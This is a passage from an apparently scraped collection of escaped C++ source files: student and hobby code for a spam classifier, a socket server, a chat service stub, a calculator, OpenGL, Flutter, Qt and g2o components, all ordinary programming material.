c\u1ee7a m\u00f4 h\u00ecnh\n    vector<double> weights(num_features);\n    double bias = 0;\n\n    // Hu\u1ea5n luy\u1ec7n m\u00f4 h\u00ecnh\n    for (int i = 0; i < num_iterations; i++) {\n        double cost = 0;\n        vector<double> dw(num_features);\n        double db = 0;\n\n        for (int j = 0; j < num_examples; j++) {\n            double z = 0;\n            for (int k = 0; k < num_features; k++) {\n                z += weights[k] * features[j][k];\n            }\n            z += bias;\n\n            double a = sigmoid(z);\n            cost += -labels[j] * log(a) - (1 - labels[j]) * log(1 - a);\n\n            for (int k = 0; k < num_features; k++) {\n                dw[k] += (a - labels[j]) * features[j][k];\n            }\n            db += a - labels[j];\n        }\n\n        cost /= num_examples;\n        for (int k = 0; k < num_features; k++) {\n            weights[k] -= learning_rate * dw[k] / num_examples;\n        }\n        bias -= learning_rate * db / num_examples;\n\n        cout << \"Iteration \" << i << \" Cost \" << cost << endl;\n    }\n\n    // Tr\u1ea3 v\u1ec1 c\u00e1c tham s\u1ed1 \u0111\u00e3 h\u1ecdc \u0111\u01b0\u1ee3c\n    vector<double> params(num_features + 1);\n    params[0] = bias;\n    for (int i = 0; i < num_features; i++) {\n        params[i + 1] = weights[i];\n    }\n\n    return params;\n}\n\n// \u0110\u1ecbnh ngh\u0129a h\u00e0m d\u1ef1 \u0111o\u00e1n m\u1ed9t email c\u00f3 ph\u1ea3i l\u00e0 spam hay kh\u00f4ng\nbool predict(vector<double>& params, Email& email) {\n    double z = params[0];\n    int num_features = params.size() - 1;\n    for (int i = 0; i < num_features; i++) {\n        string keyword = \"keyword_\" + to_string(i);\n        if (find(email.keywords.begin(), email.keywords.end(), keyword) != email.keywords.end()) {\n            z += params[i + 1];\n        }\n    }\n\n    return sigmoid(z) >= 0.5;\n}\n\nint main() {\n    // \u0110\u1ecdc d\u1eef li\u1ec7u t\u1eeb file\n    vector<Email> data = read_data(\"emails.csv\");\n\n    // T\u1ea1o vector c\u00e1c \u0111\u1eb7c tr\u01b0ng v\u00e0 vector nh\u00e3n\n    vector<vector<double>> features;\n    vector<double> labels;\n    for (auto email : data) {\n        vector<double> feature_row;\n        for (int i = 0; i < 20; i++) {\n            string keyword = \"keyword_\" + to_string(i);\n            if (find(email.keywords.begin(), email.keywords.end(), keyword) != email.keywords.end()) {\n                feature_row.push_back(1);\n            } else {\n                feature_row.push_back(0);\n            }\n        }\n        features.push_back(feature_row);\n        labels.push_back(email.is_spam ? 1 : 0);\n    }\n\n    // Hu\u1ea5n luy\u1ec7n m\u00f4 h\u00ecnh Logistic Regression\n    double learning_rate = 0.1;\n    int num_iterations = 100;\n    vector<double> params = train_logistic_regression(features, labels, learning_rate, num_iterations);\n\n    // D\u1ef1 \u0111o\u00e1n nh\u00e3n c\u1ee7a c\u00e1c email\n    int num_correct = 0;\n    int num_total = data.size();\n    for (auto email : data) {\n        bool predicted_label = predict(params, email);\n        if (predicted_label == email.is_spam) {\n            num_correct++;\n        }\n    }\n\n    // In ra k\u1ebft qu\u1ea3 \u0111\u00e1nh gi\u00e1 m\u00f4 h\u00ecnh\n    double accuracy = (double)num_correct / num_total;\n    cout << \"Accuracy: \" << accuracy << endl;\n\n    return 0;\n}\n",
    "#include \"server.h\"\n#include \"iostream\"\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <sys/types.h> /* See NOTES */\n\nint Socket_Server::server_setsockopt(int level, int optname)\n{\n    int ret;\n    ret = setsockopt(this->fd, level, optname, &this->optval, sizeof(this->optval));\n    if (ret < 0) {\n\n        std::cerr << \"setsockopt failed!!! \" << strerror(errno) << std::endl;\n        return -1;\n    }\n    return 0;\n}\n\nint Socket_Server::server_timeout_set(int sec, int usec)\n{\n    this->timeout.tv_usec = usec;\n    this->timeout.tv_sec = sec;\n    return 0;\n}\n\nvoid Socket_Server::server_cout_error(int error_code)\n{\n    if (error_code < 0) {\n        socket_close_fd(this->fd);\n        socket_close_fd(this->new_fd);\n        exit(1);\n    }\n}\n\nint Socket_Server::server_bind()\n{\n    if (bind(this->fd, (struct sockaddr*)&this->sin, sizeof(this->sin)) < 0) {\n        std::cerr << \"bind failed!!! \" << strerror(errno) << std::endl;\n        return -1;\n    }\n    return 0;\n}\n\nint Socket_Server::server_listen()\n{\n    if (listen(this->fd, 3) < 0) {\n        std::cerr << \"listen failed!!! \" << strerror(errno) << std::endl;\n        return -1;\n    }\n    return 0;\n}\n\nint Socket_Server::server_accept()\n{\n    sockaddr_in sockaddr_in_temp;\n    socklen_t addrlen = sizeof(sockaddr_in_temp);\n    if ((this->new_fd = accept(this->fd, (struct sockaddr*)&sockaddr_in_temp, &addrlen)) < 0) {\n        std::cerr << \"accept failed!!! \" << strerror(errno) << std::endl;\n        return -1;\n    } else {\n        std::cout << \"Connection accepted\" << std::endl;\n        std::cout << \"New connection, socket fd is \" << this->new_fd << \", IP is : \" << inet_ntoa(sockaddr_in_temp.sin_addr) << \", port : \" << ntohs(sockaddr_in_temp.sin_port) << std::endl;\n        sockaddr_ts.insert({ this->new_fd, sockaddr_in_temp });\n        return 0;\n    }\n}\n\nint Socket_Server::socket_judge_maxfd()\n{\n    if (this->fd > this->new_fd) {\n        this->maxfd = this->fd;\n    }\n    if (this->new_fd > this->maxfd) {\n        this->maxfd = this->new_fd;\n    }\n    return 0;\n}\n\nint Socket_Server::socket_select_set(timeval* timeout_t)\n{\n    FD_ZERO(&this->read_set);\n    for (auto it = sockaddr_ts.begin(); it != sockaddr_ts.end(); ++it) {\n        int temp_fd = it->first;\n        FD_SET(temp_fd, &this->read_set);\n    }\n    FD_SET(this->fd, &this->read_set);\n    socket_judge_maxfd();\n    if (select(this->maxfd + 1, &this->read_set, NULL, NULL, timeout_t) < 0) {\n        std::cerr << \"select failed!!\" << strerror(errno) << std::endl;\n        return -1;\n    }\n    return 0;\n}\n\nSocket_Server::~Socket_Server()\n{\n}\n\nint Socket_Server::socket_judge_set()\n{\n    this->recv_buf.clear();\n    int ret;\n    if (FD_ISSET(this->fd, &this->read_set)) {\n        ret = server_accept();\n        return ret;\n    } else {\n        for (const auto& pair : sockaddr_ts) {\n            int client_fd = pair.first;\n            const sockaddr_in& addr = pair.second;\n            if (FD_ISSET(client_fd, &read_set)) {\n                ssize_t readret = read(client_fd, this->recv_buf.data(), this->read_buffer_size);\n                if (readret == 0) {\n                    std::cout << \"Break connection, socket fd is \" << this->new_fd << \", IP is : \" << inet_ntoa(this->sockaddr_ts[client_fd].sin_addr) << \", port : \" << ntohs(this->sockaddr_ts[client_fd].sin_port) << std::endl;\n                    socket_close_fd(client_fd);\n                    sockaddr_ts.erase(client_fd);\n                    FD_CLR(client_fd, &this->read_set);\n                    return 0;\n                } else if (readret > 0) {\n                    std::string received_data = std::string(this->recv_buf.data(), readret);\n                    std::cout << received_data << std::endl;\n                    return 0;\n                } else {\n                    std::cerr << \"Error: Receive failed.\" << std::endl;\n                    return -1;\n                }\n            }\n        }\n    }\n\n    return 0; // \u5728\u8fd9\u91cc\u8fd4\u56de\uff0c\u8868\u793a\u5904\u7406\u5b8c\u6240\u6709\u5ba2\u6237\u7aef\u540e\u8fd4\u56de\n}\n\nSocket_Server::Socket_Server(int connection_num, int buffer_size)\n    : max_connections(connection_num)\n    , timeout {}\n    , read_buffer_size(buffer_size)\n{\n    new_fd = -1;\n    optval = 1;\n    recv_buf.reserve(read_buffer_size);\n    recv_buf.clear();\n}\n\nSocket_Server::Socket_Server()\n    : timeout {}\n{\n    new_fd = -1;\n    optval = 1;\n    recv_buf.reserve(read_buffer_size);\n    recv_buf.clear();\n}\n",
    "#include \"chatservice.hpp\"\n\n#include <muduo/base/Logging.h>\nusing namespace muduo;\nusing namespace placeholders;\n\n// \u83b7\u53d6\u5355\u4f8b\u7684\u63a5\u53e3\u51fd\u6570\nChatService* ChatService::getInstance()\n{\n    static ChatService instance;\n    return &instance;\n}\n\n// \u6ce8\u518c\u4e0d\u540c\u6d88\u606f\u7684\u56de\u8c03\u51fd\u6570\nChatService::ChatService()\n{\n    _msgHandlerMap.insert({LOGIN_MSG, std::bind(&ChatService::login, this, _1, _2, _3)});\n    _msgHandlerMap.insert({REG_MSG, std::bind(&ChatService::reg, this, _1, _2, _3)});\n\n}\n\nMsgHandler ChatService::getHandler(int msgid)\n{\n    auto it = _msgHandlerMap.find(msgid);\n    if (it == _msgHandlerMap.end())\n    {\n        // \u8fd4\u56de\u4e00\u4e2a\u9ed8\u8ba4hanlder\uff0c\u7a7a\u64cd\u4f5c\n        return [msgid](const TcpConnectionPtr& conn, json& js, Timestamp time) {\n            LOG_ERROR << \"can not find \" << msgid << \" handler!\";            \n        };\n    }\n    else\n    {\n        return _msgHandlerMap[msgid];\n    }\n    \n}\n\n\n// \u767b\u5f55\u4e1a\u52a1\u51fd\u6570\nvoid ChatService::login(const TcpConnectionPtr& conn, json& js, Timestamp time)\n{\n    LOG_INFO << \"login~\";\n}\n// \u6ce8\u518c\u4e1a\u52a1\u51fd\u6570\nvoid ChatService::reg(const TcpConnectionPtr& conn, json& js, Timestamp time)\n{\n    LOG_INFO << \"reg~\";\n}\n",
    "#include <iostream>\n#include <string>\n#include <locale>\n\nint main() {\n\n    char op;\n    double num1;\n    double num2;\n    double result;\n\n    std::cout << \"**********************Calculator**********************\\n\";\n\n    std::cout << \"Enter either (+ - * /): \";\n    std::cin >> op;\n\n    std::cout << \"Enter the first number: \";\n    std::cin >> num1;\n    std::cout << \"Enter the second number: \";\n    std::cin >> num2;\n    \n    switch(op){\n        case '+':\n            result = num1 + num2;\n            std::cout << \"Result: \" << result << std::endl;\n            break;\n        case '-':\n            result = num1 - num2;\n            std::cout << \"Result: \" << result << std::endl;\n            break;\n        case '*':\n            result = num1 * num2;\n            std::cout << \"Result: \" << result << std::endl;\n            break;\n        case '/':\n            result = num1 / num2;\n            std::cout << \"Result: \" << result << std::endl;\n            break;\n    }\n    std::cout << \"******************************************************\";\n    return 0;\n}\n",
    "#include \"skybox.hpp\"\n\n// NOTE: this header is header only lib\n#define STB_IMAGE_IMPLEMENTATION\n#include \"stb_image.h\"\n\nfloat skyboxVertices[] = {\n    // positions          \n        -1.0f,  1.0f, -1.0f,\n        -1.0f, -1.0f, -1.0f,\n         1.0f, -1.0f, -1.0f,\n         1.0f, -1.0f, -1.0f,\n         1.0f,  1.0f, -1.0f,\n        -1.0f,  1.0f, -1.0f,\n\n        -1.0f, -1.0f,  1.0f,\n        -1.0f, -1.0f, -1.0f,\n        -1.0f,  1.0f, -1.0f,\n        -1.0f,  1.0f, -1.0f,\n        -1.0f,  1.0f,  1.0f,\n        -1.0f, -1.0f,  1.0f,\n\n         1.0f, -1.0f, -1.0f,\n         1.0f, -1.0f,  1.0f,\n         1.0f,  1.0f,  1.0f,\n         1.0f,  1.0f,  1.0f,\n         1.0f,  1.0f, -1.0f,\n         1.0f, -1.0f, -1.0f,\n\n        -1.0f, -1.0f,  1.0f,\n        -1.0f,  1.0f,  1.0f,\n         1.0f,  1.0f,  1.0f,\n         1.0f,  1.0f,  1.0f,\n         1.0f, -1.0f,  1.0f,\n        -1.0f, -1.0f,  1.0f,\n\n        -1.0f,  1.0f, -1.0f,\n         1.0f,  1.0f, -1.0f,\n         1.0f,  1.0f,  1.0f,\n         1.0f,  1.0f,  1.0f,\n        -1.0f,  1.0f,  1.0f,\n        -1.0f,  1.0f, -1.0f,\n\n        -1.0f, -1.0f, -1.0f,\n        -1.0f, -1.0f,  1.0f,\n         1.0f, -1.0f, -1.0f,\n         1.0f, -1.0f, -1.0f,\n        -1.0f, -1.0f,  1.0f,\n         1.0f, -1.0f,  1.0f\n};\n\nSkybox::Skybox() {\n\n}\n\nvoid Skybox::load(std::string name) {\n\tshader = Shader::load(\"skybox\");\n\n    glGenTextures(1, &cubemapTexture);\n\n\tstd::vector<std::string> textures_faces = {\n\t\t\"right.jpg\",\n\t\t\"left.jpg\",\n\t\t\"top.jpg\",\n\t\t\"bottom.jpg\",\n\t\t\"front.jpg\",\n\t\t\"back.jpg\"\n\t};\n\n\tint width, height, nrChannels;\n\tunsigned char *data;\n\tfor(unsigned int i = 0; i < textures_faces.size(); i++) {\n\t\tstd::string path = \"../assets/images/\" + name + \"/\" + textures_faces[i];\n\t\tdata = stbi_load(path.c_str(), &width, &height, &nrChannels, 0);\n\t\tglTexImage2D(GL_TEXTURE_CUBE_MAP_POSITIVE_X + i, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, data);\n\t}\n\n\tglTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\tglTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n\tglTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);\n\tglTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);\n\tglTexParameteri(GL_TEXTURE_CUBE_MAP, GL_TEXTURE_WRAP_R, GL_CLAMP_TO_EDGE);\n\n\t// init skybox values\n\tglGenVertexArrays(1, &skyboxVAO);\n    glGenBuffers(1, &skyboxVBO);\n    glBindVertexArray(skyboxVAO);\n    glBindBuffer(GL_ARRAY_BUFFER, skyboxVBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(skyboxVertices), &skyboxVertices, GL_STATIC_DRAW);\n    glEnableVertexAttribArray(0);\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\n}\n\nvoid Skybox::draw(Camera *camera) {\n    glDepthMask(GL_FALSE);\n\n\tshader->use();\n\tglm::mat4 view = glm::mat4(glm::mat3(camera->get_view()));\n\tshader->setInt(\"skybox\", 1);\n\tshader->setMat4(\"view\", view);\n    shader->setMat4(\"projection\", camera->get_projection());\n\n\tglBindVertexArray(skyboxVAO);\n    glActiveTexture(GL_TEXTURE0);\n    glBindTexture(GL_TEXTURE_CUBE_MAP, cubemapTexture);\n    glDrawArrays(GL_TRIANGLES, 0, 36);\n    glBindVertexArray(0);\n\tglDepthMask(GL_TRUE);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * test2.cc - Two thread: the main thread and one more thread. Check that they switch between them properly.\n *\n * Output should be:\n * test2:\n * --------------\n * ***0***\n * ***1***\n * ***0***\n * ***1***\n * ***0***\n * ***1***\n * ***0***\n *\n */\n\n#include <stdio.h>\n#include <signal.h>\n#include <setjmp.h>\n#include <signal.h>\n#include <errno.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <time.h>\n#include <math.h>\n#include <sys/time.h>\n#include <unistd.h>\n#include <map>\n#include <list>\n#include \"uthreads.h\"\n\nint quantumR = 1000;\nint currId = -1;\nint maxRounds = 3;\nint n = 1;\n\n/* Just prints its ID after process switch. */\nvoid f()\n{\n    int id = uthread_get_tid();\n    int rounds = -1;\n    while (rounds < maxRounds){\n        if(currId != id){\n            currId = id;\n            printf(\"***%d***\\n\", id);\n            rounds++;\n            fflush(stdout);\n\n        }\n\n    }\n    uthread_terminate(id);\n}\n\n\n\nint main(int argc, char **argv)\n{\n    printf(\"test2:\\n--------------\\n\");\n    int tid;\n\n    uthread_init(quantumR);\n\n    tid = uthread_spawn(f);\n \n\n    \n    if (tid == -1)\n    \tfprintf(stderr, \"unjustified failrure to spawn\\n\");\n    fflush(stdout);\n    f();\n\n    uthread_terminate(0);\n    return 0;\n}\n",
    "#include \"ClapTrap.hpp\"\n\nClapTrap::ClapTrap()\n{\n    std::cout << \"ClapTrap nonamer has been constructed\" << std::endl;\n    this->name = \"ClapTrap\";\n    this->hitPoints = 10;\n    this->energyPoints = 10;\n    this->attackDamage = 0;\n}\n\nClapTrap::~ClapTrap()\n{\n    std::cout << \"ClapTrap \" << this->name << \" has been destructed\" << std::endl;\n}\n\nClapTrap::ClapTrap(const ClapTrap &clapTrap)\n{\n    std::cout << \"ClapTrap has been copied\" << std::endl;\n    *this = clapTrap;\n}\n\nClapTrap &ClapTrap::operator=(const ClapTrap &clapTrap)\n{\n    std::cout << \"ClapTrap has been assigned\" << std::endl;\n    this->name = clapTrap.name;\n    this->hitPoints = clapTrap.hitPoints;\n    this->energyPoints = clapTrap.energyPoints;\n    this->attackDamage = clapTrap.attackDamage;\n    return *this;\n}\n\nClapTrap::ClapTrap(std::string name)\n{\n    this->name = name;\n    this->hitPoints = 10;\n    this->energyPoints = 10;\n    this->attackDamage = 0;\n    std::cout << \"ClapTrap \" << this->name << \" has been constructed\" << std::endl;\n}\n\nvoid ClapTrap::takeDamage(unsigned int amount)\n{\n    if (this->hitPoints <= 0)\n    {\n        std::cout << this->name << \" is already dead\" << std::endl;\n        return;\n    }\n    this->hitPoints -= amount;\n    std::cout << this->name << \" has taken \" << amount << \" points of damage!\" << std::endl;\n    if (this->hitPoints <= 0)\n    {\n        std::cout << this->name << \" has died\" << std::endl;\n    }\n}\n\nvoid ClapTrap::beRepaired(unsigned int amount)\n{\n    if (this->energyPoints == 0)\n    {\n        std::cout << this->name << \" cannot be repaired because it has no energy points!\" << std::endl;\n        return;\n    }\n    if (this->hitPoints <= 0)\n    {\n        std::cout << this->name << \" cannot be repaired because is dead\" << std::endl;\n        return;\n    }\n    this->hitPoints += amount;\n    this->energyPoints -= 1;\n    std::cout << this->name << \" has been repaired for \" << amount << \" points!\" << std::endl;\n}\n\nvoid ClapTrap::attack(const std::string &target)\n{\n    if (this->energyPoints == 0)\n    {\n        std::cout << this->name << \" cannot attack because it has no energy points!\" << std::endl;\n        return;\n    }\n    if (this->hitPoints <= 0)\n    {\n        std::cout << this->name << \" cannot attack because is dead\" << std::endl;\n        return;\n    }\n    this->energyPoints -= 1;\n    std::cout << this->name << \" attacks \" << target << \" causing \" << this->attackDamage << \" points of damage!\" << std::endl;\n}",
    "// g2o - General Graph Optimization\n// Copyright (C) 2011 R. Kuemmerle, G. Grisetti, W. Burgard\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// * Redistributions of source code must retain the above copyright notice,\n//   this list of conditions and the following disclaimer.\n// * Redistributions in binary form must reproduce the above copyright\n//   notice, this list of conditions and the following disclaimer in the\n//   documentation and/or other materials provided with the distribution.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A\n// PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n// TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include \"solver.h\"\n\n#include <cstring>\n#include <algorithm>\n\nnamespace g2o {\n\nSolver::Solver() :\n  _optimizer(0), _x(0), _b(0), _xSize(0), _maxXSize(0),\n  _isLevenberg(false), _additionalVectorSpace(0)\n{\n}\n\nSolver::~Solver()\n{\n  delete[] _x;\n  delete[] _b;\n}\n\nvoid Solver::resizeVector(size_t sx)\n{\n  size_t oldSize = _xSize;\n  _xSize = sx;\n  sx += _additionalVectorSpace; // allocate some additional space if requested\n  if (_maxXSize < sx) {\n    _maxXSize = 2*sx;\n    delete[] _x;\n    _x = new double[_maxXSize];\n#ifndef NDEBUG\n    memset(_x, 0, _maxXSize * sizeof(double));\n#endif\n    if (_b) { // backup the former b, might still be needed for online processing\n      memcpy(_x, _b, oldSize * sizeof(double));\n      delete[] _b;\n      _b = new double[_maxXSize];\n      std::swap(_b, _x);\n    } else {\n      _b = new double[_maxXSize];\n#ifndef NDEBUG\n      memset(_b, 0, _maxXSize * sizeof(double));\n#endif\n    }\n  }\n}\n\nvoid Solver::setOptimizer(SparseOptimizer* optimizer)\n{\n  _optimizer = optimizer;\n}\n\nvoid Solver::setLevenberg(bool levenberg)\n{\n  _isLevenberg = levenberg;\n}\n\nvoid Solver::setAdditionalVectorSpace(size_t s)\n{\n  _additionalVectorSpace = s;\n}\n\n} // end namespace\n",
    "#include <iostream>\n#include \"Figure.h\"\n#include \"Triangle.h\"\n#include <vector>\n#include <fstream>\n#include <algorithm>\n#include <set>\n\ntemplate <typename T>\nvoid displayFigure(vector<Figure<T>*>& figures)\n{\n\tfor (auto figure : figures)\n\t{\n\t\tfigure->display();\n\t}\n}\n \ntemplate<typename T>\nvoid saveToFile(vector<Figure<T>*>& figures, string filename)\n{\n\tofstream file(filename);\n\t\tfor (auto figure : figures)\n\t\t{\n\t\t\tfigure->displayIntoFile(file);\n\t\t}\n}\n\ntemplate<typename T>\nvoid loadFromFile(vector<Figure<T>*>& figures, string filename)\n{\n\tifstream file(filename);\n\tint area, perimeter, sideA, sideB, sideC;\n\tstring type, color;\n\tstring figureType;\n\twhile (file >> type >> area >> figureType >> perimeter >> color)\n\t{\n\t\tif (type == \"Figure\")\n\t\t{\n\t\t\tfigures.push_back(new Figure<T>(area, figureType, perimeter, color));\n\t\t}\n\t\telse if (type == \"Triangle\")\n\t\t{\n\t\t\tfile >> sideA >> sideB >> sideC;\n\t\t\tfigures.push_back(new Triangle<T>(area, figureType, perimeter, color, sideA, sideB, sideC));\n\t\t}\n\t}\n}\n\nint main()\n{\n\tvector<Figure<int>*> figures;\n\tofstream file(\"input.txt\", ios::app);\n\tint choice;\n\twhile (true)\n\t{\n\t\tcout << \"Enter action: \" << endl;\n\t\tcout << \"1 - load from file and print: \" << endl;\n\t\tcout << \"2 - add object to file: \" << endl;\n\t\tcout << \"3 - print object into file: \" << endl;\n\t\tcout << \"4 - output without duplications\" << endl;\n\t\tcout << \"5 - find the biggest perimeter: \" << endl;\n\t\tcout << \"6 - find average perimeter all figures: \" << endl;\n\t\tcout << \"7 - exit \" << endl;\n\t\tcin >> choice;\n\t\tif (choice == 1)\n\t\t{\n\t\t\tloadFromFile(figures, \"input.txt\");\n\t\t\tdisplayFigure(figures);\n\t\t}\n\t\telse if (choice == 2)\n\t\t{\n\t\t\tstring type; // \u00f9\u00ee\u00e1 \u00e7\u00ed\u00e0\u00f2\u00e8 \u00ff\u00ea\u00e8\u00e9 \u00ea\u00eb\u00e0\u00f1\n\t\t\tint area, perimeter, sideA, sideB, sideC;\n\t\t\tstring figureType, color;\n\t\t\tcout << \"Enter type: \";\n\t\t\tcin >> type;\n\t\t\tif (type == \"Figure\")\n\t\t\t{\n\t\t\t\tcout << \"Enter area: \";\n\t\t\t\tcin >> area;\n\t\t\t\tcout << \"Enter type: \";\n\t\t\t\tcin >> figureType;\n\t\t\t\tcout << \"Enter perimeter: \";\n\t\t\t\tcin >> perimeter;\n\t\t\t\tcout << \"Enter color: \";\n\t\t\t\tcin >> color;\n\t\t\t\tFigure<int>* f = new Figure<int>(area, figureType, perimeter, color);\n\t\t\t\tf->saveWithSpaces(file);\n\t\t\t}\n\t\t\telse if (type == \"Triangle\")\n\t\t\t{\n\t\t\t\tcout << \"Enter area: \";\n\t\t\t\tcin >> area;\n\t\t\t\tcout << \"Enter type: \";\n\t\t\t\tcin >> figureType;\n\t\t\t\tcout << \"Enter perimeter: \";\n\t\t\t\tcin >> perimeter;\n\t\t\t\tcout << \"Enter color: \";\n\t\t\t\tcin >> color;\n\t\t\t\tcout << \"Enter sideA: \";\n\t\t\t\tcin >> sideA;\n\t\t\t\tcout << \"Enter sideB: \";\n\t\t\t\tcin >> sideB;\n\t\t\t\tcout << \"Enter sideC: \";\n\t\t\t\tcin >> sideC;\n\n\t\t\t\tTriangle<int>* f = new Triangle<int>(area, figureType, perimeter, color, sideA, sideB, sideC);\n\t\t\t\tf->saveWithSpaces(file);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Error! \" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\telse if (choice == 4)\n\t\t{\n\t\t\tloadFromFile(figures, \"input.txt\");\n\t\t\tset<string> unique;\n\t\t\tfor (auto f : figures) {\n\t\t\t\tunique.insert(f->getType());\n\t\t\t}\n\t\t\tfor (auto u : unique)\n\t\t\t{\n\t\t\t\tcout << u << \" \";\n\t\t\t}\n\t\t\tcout << endl;\n\t\t}\n\t\telse if (choice == 5)// find the biggest perimeter)\n\t\t{\n\t\t\tloadFromFile(figures, \"input.txt\");\n\t\t\tFigure<int>* biggest = figures[0];\n\t\t\tfor (auto f : figures)\n\t\t\t{\n\t\t\t\tif (f->getPerimeter() > biggest->getPerimeter())\n\t\t\t\t{\n\t\t\t\t\tbiggest = f;\n\t\t\t\t}\n\t\t\t}\n\t\t\tcout << \"The biggest perimeter: \";\n\t\t\tbiggest->display();\n\t\t\tcout << endl;\n\t\t}\n\t\telse if (choice == 6)\n\t\t{\n\t\t\tloadFromFile(figures, \"input.txt\");\n\t\t\tint allPerimeters = 0;\n\t\t\tfor (auto f : figures)\n\t\t\t{\n\t\t\t\tallPerimeters += f->getPerimeter();\n\t\t\t}\n\t\t\tcout << allPerimeters / figures.size()<<endl;\n\t\t}\n\t\telse if (choice == 7)\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"Error! \" << endl;\n\t\t}\n\t}\n\t    \n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"canvas.h\"\n\n/// Reviewed by Scott Skidmore\nCanvas::Canvas(QWidget *parent) : QLabel{parent}\n{\n    setMouseTracking(true);\n    trackMouse = false;\n}\n\nvoid Canvas::setGridSize(int size)\n{\n    this->gridSize = size;\n    cellSize = 512 / gridSize;\n}\n\n\nvoid Canvas::paintEvent(QPaintEvent *event)\n{\n    QPainter painter(this);\n    QPen pen(Qt::lightGray);\n    pen.setWidth(1);\n    painter.setPen(pen);\n\n    for (int i = 0; i < gridSize+1; i++)\n    {\n        int xy = i * (512/gridSize);\n        painter.drawLine(xy, 0, xy, 512);\n        painter.drawLine(0, xy, 512, xy);\n    }\n\n    if (!layers.empty())\n    {\n        for(QImage layer : layers)\n        {\n            painter.drawPixmap(0, 0,512,512, QPixmap::fromImage(layer));\n        }\n    }\n}\n\nvoid Canvas::mouseMoveEvent(QMouseEvent *event)\n{\n    if (trackMouse)\n    {\n        if (event->pos().x() <= 512 && event->pos().y() <= 512 && event->pos().x() >= 0 && event->pos().y() >= 0)\n        {\n            int x = event->pos().x() / cellSize;\n            int y = event->pos().y() / cellSize;\n            emit gridClicked(QPoint(x, y));\n        }\n        QWidget::update();\n    }\n}\n\nvoid Canvas::mousePressEvent(QMouseEvent *event)\n{\n    int x = event->pos().x() / cellSize;\n    int y 